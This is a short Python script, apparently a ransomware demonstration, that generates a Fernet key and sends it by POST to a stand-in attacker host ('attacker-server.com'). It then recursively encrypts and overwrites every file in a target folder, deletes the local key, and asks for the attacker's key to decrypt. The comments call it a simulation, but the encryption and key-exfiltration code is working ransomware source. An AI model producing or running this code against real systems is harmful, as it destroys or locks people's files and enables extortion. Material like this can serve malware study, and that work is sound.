from cryptography.fernet import Fernet
import requests
import os

TARGET_FOLDER = "path/to/destination/folder"  # Change to your target folder

# Generate and save the encryption key
def generate_key():
    key = Fernet.generate_key()
    with open("encryption_key.key", "wb") as key_file:
        key_file.write(key)
    return key

# Load the encryption key
def load_key():
    with open("encryption_key.key", "rb") as key_file:
        return key_file.read()

# Encrypt files in a directory
def encrypt_files(directory, key):
    fernet = Fernet(key)
    for root, _, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            try:
                with open(file_path, "rb") as f:
                    data = f.read()
                encrypted_data = fernet.encrypt(data)
                with open(file_path, "wb") as f:
                    f.write(encrypted_data)
                print(f"Encrypted: {file_path}")
            except Exception as e:
                print(f"Failed to encrypt {file_path}: {e}")

# Decrypt files in a directory
def decrypt_files(directory, key):
    fernet = Fernet(key)
    for root, _, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            try:
                with open(file_path, "rb") as f:
                    encrypted_data = f.read()
                decrypted_data = fernet.decrypt(encrypted_data)
                with open(file_path, "wb") as f:
                    f.write(decrypted_data)
                print(f"Decrypted: {file_path}")
            except Exception as e:
                print(f"Failed to decrypt {file_path}: {e}")

# Simulate deleting the local key file
def delete_key_file():
    try:
        os.remove("encryption_key.key")
        print("Encryption key file deleted successfully.")
    except FileNotFoundError:
        print("Key file not found. It may have already been deleted.")
    except Exception as e:
        print(f"Error deleting the key file: {e}")

# Send the key to the attacker
def send_key_to_attacker(key):
    url = "http://attacker-server.com/store_key"
    payload = {"key": key.decode(), "victim_id": "unique_id_for_target"}
    requests.post(url, json=payload)


if __name__ == "__main__":
    # Step 1: Generate the key and save it locally
    print("Generating the key...")
    key = generate_key()

    # Step 2: Send the generated key to the attacker
    print("Sending the key to the attacker...")
    send_key_to_attacker(key)
   
    # Step 3: Encrypt the files
    print("Encrypting files in the target folder...")
    encrypt_files(TARGET_FOLDER, key)
    
    # Step 4: Simulate deleting the local key file
    print("\n**Simulating ransomware attack: deleting the encryption key from the victim's system...**")
    delete_key_file()
    print("\nFiles are now encrypted and inaccessible.")
    print("To decrypt your files, retrieve the decryption key from the attacker (simulated below).")

    # Step 5: Simulate key retrieval and decryption
    retrieved_key = input("\nEnter the decryption key provided by the attacker: ").strip().encode()
    print("\nDecrypting files...")
    decrypt_files(TARGET_FOLDER, retrieved_key)
    print("Files decrypted successfully (if the correct key was provided).")
